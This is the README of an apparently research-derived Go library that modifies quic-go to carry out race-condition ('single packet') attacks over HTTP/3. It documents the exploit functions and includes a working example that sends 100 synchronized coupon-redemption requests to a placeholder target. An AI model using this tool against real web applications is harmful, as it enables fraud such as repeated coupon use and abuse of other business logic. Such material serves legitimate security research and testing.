# H3SpaceX
H3SpaceX library is manipulated version of [quic-go](https://github.com/quic-go/quic-go) to 
enable the Single Packet Attack (Last Frame Synchronization) in HTTP/3 (QUIC). 
This library was part of an academic research with title of **Exploiting Race Conditions in Web Applications with HTTP/3**.

## Library Usage (how to exploit last frame synchronization - also known as single packet attack on HTTP/3)
There are two methods for exploiting last frame synchronization:

- Function `SendRequestsWithLastFrameSynchronizationMethod`:
- This function is for requests `which have body`!
- Function parameters:
  - first param gets an array of requests which need to be sent.
  - second param is for number of bytes which needs to be kept from end of the DATA frame. (at least & best 1)
  - third param is for number of milliseconds which library waits before sending last DATA frames
  - fourth param is for setting or unsetting Content-Length header. If false, the Content-Header will not be set, unless you set it directly in requests headers
- Function return:
  - a map of requests with value of their response
```go
func SendRequestsWithLastFrameSynchronizationMethod(quicConn quic.Connection,
	allRequests []*http.Request,
	lastByteNum int,
	sleepMillisecondsBeforeSendingLastByte int,
	setContentLength bool,
) map[*http.Request]*http.Response
```

- Function `SendGetNoBodyRequestsWithSinglePacketAttackMethod`:
- This function is for requests `which do *not* have body`!
- Function parameters:
    - first param gets an array of requests which need to be sent.
    - second param is for number of milliseconds which library waits before sending last DATA frames
- Function return:
    - a map of requests with value of their response
```go
func SendGetNoBodyRequestsWithSinglePacketAttackMethod(quicConn quic.Connection,
	allRequests []*http.Request,
	sleepMillisecondsBeforeSendingLastByte int,
) map[*http.Request]*http.Response
```

### Installation

    go get github.com/nxenon/h3spacex


### Steps to Call Functions
- Import libraries
- Create TLS config 
- Create QUIC config
- create a list of requests (use http3.GetRequestObject function) and append them into requests list
- Establish QUIC connection
- Call http3.SendRequestsWithLastFrameSynchronizationMethod `or` http3.SendGetNoBodyRequestsWithSinglePacketAttackMethod methods based on your needs
```go
package main

import (
	"crypto/tls"
	"fmt"
	"strings"

	"context"
	"github.com/nxenon/h3spacex"
	"github.com/nxenon/h3spacex/http3"
	"io"
	"net/http"
	"os"
	"time"
)

func main() {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{http3.NextProtoH3},
	}

	quicConf := &quic.Config{
		MaxIdleTimeout:  10 * time.Second,
		KeepAlivePeriod: 10 * time.Millisecond,
	}

	var allRequests []*http.Request

	headers := map[string]string{
		"Cookie":       "x=y",
		"Content-Type": "application/json", // sample
	}

	reqBody := "{\"couponValue\":\"Coupon1\"}"

	for i := 0; i < 100; i++ { // 100 requests
		req, err2 := http3.GetRequestObject("https://DOMAIN.COM/api/cart/apply_coupon", "POST", headers, []byte(reqBody))
		if err2 != nil {
			fmt.Println("Error creating request: ", err2)
			continue
		}
		allRequests = append(allRequests, &req)
	}

	dialAddress := "IP:PORT" // destination IP address and UDP port
	ctx := context.Background()
	quicConn, err := quic.DialAddr(ctx, dialAddress, tlsConf, quicConf)
	if err != nil {
		fmt.Printf("Error Connecting to %s. Erorr: %s", dialAddress, err)
		os.Exit(1)
	}

	allResponses := http3.SendRequestsWithLastFrameSynchronizationMethod(quicConn, allRequests, 1, 150, true)

	for req, res := range allResponses {
		fmt.Printf("for request to %s\n", req.URL)
		fmt.Println("+---Headers---+")
		fmt.Printf("Status Code: %d\n", res.StatusCode)
		for key, value := range res.Header {
			fmt.Printf("%s: %s\n", key, value[0])
		}
		fmt.Println("+---Body---+")
		body, err3 := io.ReadAll(res.Body)
		if err3 != nil {
			fmt.Println("Error reading response body:", err3)
			continue
		}
		fmt.Println(string(body))

	}
}

```


## Exploits Sample
See [Exploit](./exploit) Directory

## References
- [quic-go](https://github.com/quic-go/quic-go) as base library
